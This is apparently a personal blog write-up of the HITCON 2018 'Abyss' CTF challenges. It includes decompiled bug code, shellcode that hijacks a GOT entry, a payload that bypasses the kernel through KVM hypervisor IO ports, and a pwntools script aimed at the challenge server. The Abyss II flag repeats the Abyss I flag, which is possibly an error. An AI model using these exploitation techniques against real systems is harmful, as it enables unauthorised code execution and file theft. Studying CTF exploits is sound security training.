---
title:  "HITCON CTF Writeups"
date:   2018-10-22
categories:
 - Write-Ups
 - HITCON CTF
tags: 
 - KVM
 - Kernel
 - pwnable
---

Hello. So I just competed in the HITCON competition with UTDCSG. I was
personally able to solve only two problems: abyss I and II. I was going to move
to abyss III and solve that, but that required reading up on kvm documentation,
and I wasn't in the mood to doing that (but I think I had a good idea).

This was also my first real CTF competition trying out a recently obtained IDA 7
Pro with HexRays, which added a huge boost to my performance.

Unfortunately, not a lot of other teammates had time to contribute to HITCON
CTF, so it was basically just me competing in it.

## Abyss I

Before diving into the problem, I first looked at how the three binaries worked
together. I saw the `hypervisor.elf` program essentially invoked KVM to prepare
a virtual machine loaded with a custom `kernel.bin` kernel. This kernel is a
watered down version of linux with only certain syscalls implemented, and then
this kernel in turn invokes a statically linked executable. 

In the hypervisor, we prepared an argument to `ld.so.2`, which is the `user.elf`
so that `ld.so.2` binary would load `user.elf` and invoke it. After a bit of
reversing, I found that `user.elf` is just a reverse polish calculator, but to
separate different operands I separated each of them with a \` operator. (It was
technically an invalid operator, but I noticed that the program just skips over
invalid operators so I just used that ;)

After I got a pretty good picture of how the infrasture worked for the
`user.elf` I found that there was an interesting exploit with the `swap`
operation:

```c
unsigned int *swap()
{
  unsigned int v0; // ST04_4
  unsigned int *result; // rax

  v0 = stack[stack_ptr - 1];
  stack[stack_ptr - 1] = stack[stack_ptr - 2];
  result = stack;
  stack[stack_ptr - 2] = v0;
  return result;
}
```

Apparently, unlike other code, this function did not check the stack index to
whether if it would be out of bounds. Intrestingly, the stack pointer happens to
reside directly before the operand stack, so I can change the stack pointer to
*anything* I want. Boom! Exploit found. (Though in my weary state, I naively
chose to change it with -1, so I ended up doing a LOT of pivots to get to where
I need).

So now I needed to figure out how to get
code control. Instinctively, I thought of ret-to-libc to get shell. In
hindsight, I'm glad I didn't go down that route, because it was until later I
found out that a lot of the syscalls (include execve) were actually NOT 
implemented. At that point, I saw that a hint was released saying if there was
NX. I thought for a moment, yeah duhh... but as I thought for a moment, maybe
the kernel may not have enabled NX.

So I tried just simply modifying the GOT entry for printf, which was the logical
choice since it was only used when printing a number. Now the only remaining
issue was with trying to figure out a way around ASLR. This involved doing a
little bit more calculations within the reverse-polish calculator-esque program,
which was quite interesting. Then after that I modified the GOT entry to jump to
a shell code, which I prepared at the beginning of the stack. To do this I ended
up writing an [assembler][1] to both assemble the shellcode in a way that would
prepare my shellcode, and then run the operations to overwrite GOT entry. Here
is my special "assembly" code. I used a `ASM` and `ENDASM` block to denote a
block of assembly code. 

```asm
# Stack = 0x2020A0
# 

0 # padding
ASM
  # Open file
  lea rdi, [rip + flag]
  xor esi, esi # O_RDONLY
  mov eax, 2
  syscall

  # If an error occurs, exit
  mov ecx, eax
  cmp ecx, 0
  jl exit

  # Read from file
  mov edi, eax
  mov rsi, rsp
  mov edx, 0x100
  mov eax, 0
  syscall

  # If error occurs exit
  mov ecx, eax
  cmp ecx, 0
  jl exit
  
  # Write flag that we read
  mov edi, 1
  mov rsi, rsp
  mov edx, eax
  mov eax, 1
  syscall

  mov ecx, 0

exit:
  mov edi, ecx
  mov eax, 60
  syscall

flag:
  .string "flag" 
ENDASM  
pop

# Okay cause stack underflow
1
neg
swap # cause a stack underflow, and swap with stack ptr
pop
pop

# Store the pointer to stdin
#writed
#writed
0
store
1
store

# Note that stdin is now clobbered!
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
pop
# Now our pointer is at __ctype_b_loc
pop
pop
pop
pop
pop
pop
pop
pop
# Pointer is at __stack_chk_fail with offset 0x7b6
2 # HI
store
3 # LO
store

# Calculate stack: LO + 0x2020a8 - 0x7b6
3
fetch
2103538
add
3
store

# Move pointer to printf
0
0
0
0
# Override printf
3
2
fetch
pop
fetch
writed

#writed
#writed
```

In the end I ran this command:

```sh
python assembler.py exp1.asm | nc 35.200.23.198 31733
```

And the flag is: `hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}`.

## Abyss II
So after digging around in the kernel a bit more, I found that the kernel
syscalls actually were just wrappers that used IO ports to defer to the
hypervisor. Before that I found that there were some IO ports that were
servicing certain syscalls for the kernel:

```c
int __fastcall process_io(unsigned __int16 port, kernel_state *state)
{
  if ( port == 0x8004 )
    return hp_handle_close(state);
  if ( (signed int)port > 0x8004 )
  {
    if ( port == 0x8007 )
      return hp_handle_access(state);
    if ( (signed int)port > 0x8007 )
    {
      if ( port == 0x8008 )
        return hp_handle_ioctl(state);
      if ( port == 0xFFFF )
        hp_panic(state);
    }
    else
    {
      if ( port == 0x8005 )
        return hp_handle_fstat(state);
      if ( port == 0x8006 )
        hp_exit(state);
    }
  }
  else
  {
    if ( port == 0x8001 )
      return hp_handle_read(state);
    if ( (signed int)port > 0x8001 )
    {
      if ( port == 0x8002 )
        return hp_handle_write(state);
      if ( port == 0x8003 )
        return hp_handle_lseek(state);
    }
    else if ( port == 0x8000 )
    {
      return hp_handle_open(state);
    }
  }
  return -38;
}
```

Hmm... okay so that's actually pretty damn cool to see how the kernel and user
program interacts with the hypervisor.

Speaking of the kernel, originally, I thought the kernel was actually just a
stock linux kernel. After looking into the hypervisor, I realized that the
kernel was actually custom built (amazing!).

I was too lazy to find if there was a bug in the kernel code. So I thought, what
if I just directly communicate to the IO ports to the hypervisor, circumventing
the kernel.

I first tried it by doing the injecting the assembly code:
```asm
mov dx, 0xffff
mov eax, 0
out dx, eax
```

Which should cause a "PANIC" message within the hypervisor. To my surprise, this
actually worked when I connected to the network! This was a very exciting
moment... :) So it came down to trying to opening this `flag2` file and then
reading from it. Hmm... a little issue here...

I'm in a user program, which has virtual addresses.

I need pointers to some real address space.

The problem is, I could be running a program that can access some memory located
at 0x100000000 without necessarily having the address space from 0-0xffffffff
accessible. This allows every program to "believe" it owns the entire address
space... yay! 

But this results in a huge problem because the hypervisor expects pointers to
real address values... correction, offsets from the beginning of this memory
block. Though I noticed something perculiar. First, the kernel is actually
loaded at real address ZERO, and then I noticed that the kernel is doing some
strange XOR operation, xoring `0x8000000000` with all of its addresses before
passing them to the hypervisor.

Perhaps, in virtual memory the kernel is located at a static address
0x8000000000, so maybe I could just write somewhere in Kernel, and pretend to
the hypervisor that I actually own that memory. I ended up first issuing a
"read" command first to write to kernel memory via user input, then issuing an
"open" command, passing the pathname to address zero. This turned out to be
quite nice, especially for the next stage, which I did not finish on time. 

But wait... how do I pass arguments to read? See the code to read in the kernel
is this:
```c
__int64 __fastcall hp_read(int fd, char *buff, __int64 size)
{
  __int64 v3; // r12
  signed __int64 args; // rax
  void **args_1; // rbx
  void **args_; // rax
  unsigned int res; // ST0C_4

  v3 = size;
  args = kmalloc(0x18uLL, 0);
  args[0] = (void*)fd;
  args[1] = buff;
  args[2] = (void*)v3;
  args_1 = (_QWORD *)args;
  LODWORD(args_) = (unsigned __int64)kernel_to_hyper((char *)args);
  res = serial_comm(0x8001u, (unsigned int)args_);
  kfree(args_1);
  return res;
}
```

which means that the kernel actually passes a memory address of the argument
array to the hyperviser, rather than just the arguments directly. See my
requirements were very simple, for the first argument, `fd` it should be 0, or
stdin. The second argument, `buff`, should be 0 as well. It was the third
argument, `size` that should preferably be nonzero, but I didn't need a specific
value, it just had to be big enough. Actually, after a bit of thinking I used
part of the syscall table as an array to pass into the read hyperviser IO port.
It was a perfect match because it had a lot of zero's, with a few sparse values,
not too large because they were addresses corresponding to the beginning of the 
kernel image. 

So what I ended up doing was a two step input process. First, I
would input a similar "reverse-polish notation" program as the first exploit,
but change the assembly payload a bit so to open up `flag2`. Then I would pass
in the name of the file to read. Here is my python exploit 2 that does that:

```python
from pwn import *
from assembler import assemble # This was my assembler code

code = assemble('exp2.asm')

p = remote('35.200.23.198', 31733)
p.sendline(code)
p.recvuntil('Please enter filename to open:\0')
p.send('flag\0')
print('The flag is ' + p.recvline())
```

And my (abridged) assembly code:

```asm
0 # padding
ASM
  mov edi, 1
  lea rsi, [rip + prompt]
  mov edx, promptend - prompt
  mov eax, 1
  syscall

  # Exit if error
  mov ecx, eax
  cmp ecx, 0
  jl exit

  # Read into kernel memory
  mov dx, 0x8001 # read
  mov eax, 0x4010 # 0x4010 has values 0, 0, ##
  out dx, eax
  in eax, dx

  # Invoke open file
  mov dx, 0x8000 # open
  mov eax, 0 # Contains "flag"
  out dx, eax
  in eax, dx

  mov ecx, eax
  cmp ecx, 0
  jl exit

  # Same as part 1...
  mov edi, eax
  mov rsi, rsp
  mov edx, 0x100
  mov eax, 0
  syscall

  mov ecx, eax
  cmp ecx, 0
  jl exit
  
  mov edi, 1
  mov rsi, rsp
  mov edx, eax
  mov eax, 1
  syscall

  mov ecx, 0

exit:
  mov edi, ecx
  mov eax, 60
  syscall

prompt:
  .string "Please enter filename to open:"
  # oops this contains a null term as well...
promptend:
ENDASM  

pop

# Okay cause stack underflow
1
neg
swap # cause a stack underflow, and swap with stack ptr
pop
pop

# ... same as previous exploit code
```

Okay so the flag for this one was `hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}`

## Abyss 3
Okay so I haven't totally finished it yet. So basically what I have done so far,
I want to be able to get kernel shellcode to run so that I can easily access
kernel memory. 

So first, I can simply copy the code from part 2, but instead of writing a flag,
I overwrite the first part of the kernel. Since I know that there is a function
that is called when the `syscall` instruction is invoked, I can just overwrite
the first part of that syscall handler function, replacing it with a jump to a
part of kernel that I control, let's just use the address 0 to begin my
shellcode. I had a bit of trouble with the machine mysteriously shutting down
right after the IO read (not a syscall) when I tried replacing the 103'th
byte with some value smaller than 21. No idea why it's happening.

To be continued...


[1]: /files/hitcon/abyss/assembler.py
